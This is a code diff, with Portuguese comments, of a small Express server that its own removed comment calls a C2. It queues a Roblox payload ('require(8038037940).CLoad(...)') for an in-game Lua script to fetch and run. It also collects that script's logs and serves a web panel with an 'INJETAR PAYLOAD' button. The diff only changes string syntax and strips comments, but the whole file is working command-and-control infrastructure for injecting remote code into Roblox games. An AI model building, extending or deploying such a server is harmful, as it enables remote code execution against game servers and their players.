@@ -18,16 +18,14 @@ let serverLogs = [];
 
 function addLog(msg) {
     console.log(msg);
-    serverLogs.push(`[${new Date().toLocaleTimeString()}] ${msg}`);
+    serverLogs.push("[" + new Date().toLocaleTimeString() + "] " + msg);
     if (serverLogs.length > 50) serverLogs.shift();
 }
-
-// --- ROTAS DO C2 ---
 
 app.post('/roblox/conectar', (req, res) => {
     robloxConectado = true;
     lastPing = Date.now();
-    addLog(`[+] Roblox Conectado (IP: ${req.ip})`);
+    addLog("[+] Roblox Conectado (IP: " + req.ip + ")");
     res.json({ ok: true });
 });
 
@@ -36,8 +34,8 @@ app.get('/pegar_script', (req, res) => {
     
     if (filaScripts.length > 0) {
         const script = filaScripts.shift();
-        addLog(`[>] Enviando payload da fila: ${script}`);
-        res.type('text/plain').send(script); // Força envio como texto puro
+        addLog("[>] Enviando payload da fila: " + script);
+        res.type('text/plain').send(script); 
     } else {
         res.send(''); 
     }
@@ -50,14 +48,13 @@ app.post('/inject', (req, res) => {
 
     const payload = 'require(8038037940).CLoad("nottheunidex")';
     filaScripts.push(payload);
-    addLog(`[!] Payload enfileirado manualmente pelo Painel.`);
+    addLog("[!] Payload enfileirado manualmente pelo Painel.");
     res.json({ ok: true });
 });
 
-// Recebe os logs do script Lua no jogo
 app.post('/log', (req, res) => {
     const msg = req.body.msg || req.body;
-    if (msg) addLog(`[LUA] ${msg}`);
+    if (msg) addLog("[LUA] " + msg);
     res.send('ok');
 });
 
@@ -66,7 +63,6 @@ app.get('/status', (req, res) => {
     res.json({ connected: robloxConectado && isAlive, logs: serverLogs });
 });
 
-// --- INTERFACE HTML ---
 app.get('/', (req, res) => {
     res.send(`
     <!DOCTYPE html>
@@ -118,7 +114,11 @@ app.get('/', (req, res) => {
                         injectBtn.disabled = true;
                     }
 
-                    logBox.innerHTML = data.logs.map(l => `<div>> ${l}</div>`).join('');
+                    // Correção do erro de sintaxe: usando concatenação com + ao invés de crases
+                    logBox.innerHTML = data.logs.map(function(l) { 
+                        return '<div>> ' + l + '</div>'; 
+                    }).join('');
+                    
                     logBox.scrollTop = logBox.scrollHeight;
                 } catch (e) {}
             }, 2000);
@@ -128,9 +128,9 @@ app.get('/', (req, res) => {
                 injectBtn.innerText = "ENVIANDO...";
                 try {
                     await fetch('/inject', { method: 'POST' });
-                    setTimeout(() => { injectBtn.innerText = "INJETAR PAYLOAD"; }, 2000);
+                    setTimeout(function() { injectBtn.innerText = "INJETAR PAYLOAD"; }, 2000);
                 } catch (e) {
-                    setTimeout(() => { injectBtn.innerText = "INJETAR PAYLOAD"; injectBtn.disabled = false; }, 2000);
+                    setTimeout(function() { injectBtn.innerText = "INJETAR PAYLOAD"; injectBtn.disabled = false; }, 2000);
                 }
             }
         </script>
@@ -139,4 +139,4 @@ app.get('/', (req, res) => {
     `);
 });
 
-app.listen(PORT, () => console.log(`[SERVER] Online na porta ${PORT}`));
+app.listen(PORT, () => console.log("[SERVER] Online na porta " + PORT));
